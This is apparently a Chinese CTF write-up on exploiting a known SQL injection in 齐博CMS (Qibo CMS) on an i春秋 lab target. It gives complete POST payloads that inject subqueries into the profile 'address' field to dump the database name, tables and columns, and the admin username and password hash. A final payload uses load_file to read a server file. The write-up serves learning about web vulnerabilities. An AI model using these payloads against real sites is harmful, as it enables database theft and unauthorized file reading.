# 再见CMS--齐博CMS

[2018-09-21]()

刚刚在i春秋上做了一道CMS的题，学到的东西挺多的，这里记录一下

> 题目名称：再见CMS  
> 题目内容：这里还是有一个小脑洞  
>   
> 访问链接之后看到的是一个网站，输入`url/admin`直接就进入了后台（不过这道题没什么用）

```
渗透CMS网站的三个步骤：
        1. 第一步,肯定是要判断出cms类型
        2. 第二步,查询该cms曾经出现的漏洞
        3. 第三步,然后利用这些漏洞拿到flag.
```

### [](#0x01-第一步，判断CMS类型： "0x01 第一步，判断CMS类型：")0x01 第一步，判断CMS类型：

恕我太菜，看了半天也没判断出来是哪种类型，人家说拿最下边的备案号到工信部一查就有网站的信息了，可是我查了一下返回没有匹配到类型，然后看了一下别人的writeup，说是齐博CMS

知道了CMS类型就要进行第二步了

### [](#0x02-第二步，搜索齐博CMS的漏洞 "0x02 第二步，搜索齐博CMS的漏洞")0x02 第二步，搜索齐博CMS的漏洞

百度上一找还是有漏洞的，最典型的就是SQL注入了，接下来我们来看看如何进行注入  
先注册一个用户，然后登录上去  
根据搜索出来的文章，漏洞在`/member/userinfo.php?job=edit&step=2`这个页面，这里存放的是个人信息，我们的注入就是通过构造语句把需要的信息显示在这些个人信息后边：  
![](1.png)

```
根据网上提供的漏洞利用方法，构造这样一个注入语句：
http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&step=2
post数据：
old_password=123456truename=xxxx%0000&Limitword[000]=&email=123456@qq.com&provinceid=,address=(select version()) where uid=3 %23 
```

这个URL其实是对个人信息修改的URL，我们访问这个URL就可以修改个人信息  
而下边POST的数据就是要修改的东西  
old\_password是旧密码，后边uid是我们访问个人信息页面时URL里给的，重点在address里面，`address=`，这个后边的值本来应该填写你要修改的新地址的，我们把注入语句放到这里就可以把注入查询到的东西显示在页面的`联系地址`后边  
![](2.png)  
填好之后访问一下会返回`修改成功，页面正在跳转`  
![](4.png)

然后我们查看一下个人信息，主要看`联系地址`一栏  
![](5.png)

我们可以看到注入成功了，返回了我们需要的东西，那么就开始注入吧。

```
查询数据库：
URL:http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&step=2
POST:old_password=123456&truename=xxxx%0000&Limitword[000]=&email=test@qq.com&provinceid=,address=(select database()) where uid=3 %23 

返回数据库：blog
```

![](6.png)

```
查询表:
URL:http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&step=2
POST:old_password=123456&truename=xxxx%0000&Limitword[000]=&email=test@qq.com&provinceid=,address=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where uid=3 %23 

查到了很多的表，但是我觉得就第一个有用：admin
```

![](7.png)  
查询列：  
URL:<http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&step=2>  
POST:old\_password=123456\&truename=xxxx\%0000\&Limitword\[000\]<=&email=test@qq.com>\&provinceid=,address=\(select group\_concat\(column\_name\) from information\_schema.columns where table\_name=0x61646d696e\) where uid=3 \%23

```
hint:这里由于‘table_name=’的值需要带引号的，但是带了引号语句就报错了，所以利用十六进制来绕过，可以不用带引号

返回列：id,username,password,Email
```

![](8.png)

```
查询字段：
URL:http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&step=2
POST:old_password=123456&truename=xxxx%0000&Limitword[000]=&email=test@qq.com&provinceid=,address=(select group_concat(username,password) from admin) where uid=3 %23 

返回username:admin   password:2638127c92b79ee7901195382dc08068
```

![](9.png)

去了各种md5解码网站都查不出来，无奈可能是思路错了

然后访问了一下`url/flag.php`,输出了flag is here 那么我们的任务就是查看这个文件了

如何利用SQL注入查看文件呢？

<https://www.cnblogs.com/blacksunny/p/8060028.html>

知道了这个方法我们就来构造payload：

```
URL:http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&step=2
    POST:old_password=123456&truename=xxxx%0000&Limitword[000]=&email=test@qq.com&provinceid=,address=(select load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870)) where uid=3 %23
```

括号里的十六进制是要查看的文件的路径`/var/www/html/flag.php`，我们可以在主页的最上边看到网站的绝对路径

访问之后再查看个人信息的联系地址一栏发现是空的，没关系 查看页面源代码  
![](10.png)

这样就得到了flag